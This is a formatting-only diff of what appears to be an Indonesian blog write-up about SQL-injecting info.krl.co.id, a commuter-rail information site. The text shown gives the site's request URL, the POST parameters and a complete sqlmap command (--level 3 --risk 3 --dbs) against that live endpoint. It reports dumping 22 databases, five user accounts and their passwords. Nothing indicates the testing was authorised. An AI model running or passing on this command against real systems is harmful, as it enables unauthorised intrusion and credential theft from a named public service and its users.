@@ -18,7 +18,7 @@ Lalu saya mendapatkan request url dan post data nya, berikut data nya
 ![ ](https://miro.medium.com/max/2400/1*N0WmvrJLyHYetYC0iBAfRA.png)
 
 > Request Url: http://info.krl.co.id//VQFXIQNcRQkEQkdHVh1aW1dfQDhGF0dFRxFRFB8WbVBKTRYIXUZPWUBYTARWTAlWVEBSCV9TSFoAUARUWgMGCTo1MDRjZDI3Mg==
-> Post data : no_ka=1465&id_stasiun=BKS
+Post data : no_ka=1465&id_stasiun=BKS
 
 ___
 
@@ -34,9 +34,9 @@ ___
 
 Selanjutnya saya scan di SQLMAP dengan command
 
-'''
+```
 sqlmap -u "http://info.krl.co.id//VQFXIQNcRQkEQkdHVh1aW1dfQDhGF0dFRxFRFB8WbVBKTRYIXUZPWUBYTARWTAlWVEBSCV9TSFoAUARUWgMGCTo1MDRjZDI3Mg==" --data="no_ka=1465&id_stasiun=BKS" --level 3 --risk 3 --dbs
-'''
+```
 
 Maka hasil scannya adalah saya mendapatkan 22 database
 
@@ -44,11 +44,11 @@ Maka hasil scannya adalah saya mendapatkan 22 database
 
 Dan 5 Users
 
-!(https://miro.medium.com/max/2400/1*rhfD2OEMFsrUyq-pecfh-w.png)
+![ ](https://miro.medium.com/max/2400/1*rhfD2OEMFsrUyq-pecfh-w.png)
 
 Beserta Passwordnya
 
-!(https://miro.medium.com/max/2400/1*dhPyZ0hre8jHl2G8vZ2XwQ.jpeg)
+![ ](https://miro.medium.com/max/2400/1*dhPyZ0hre8jHl2G8vZ2XwQ.jpeg)
 
 ___
 
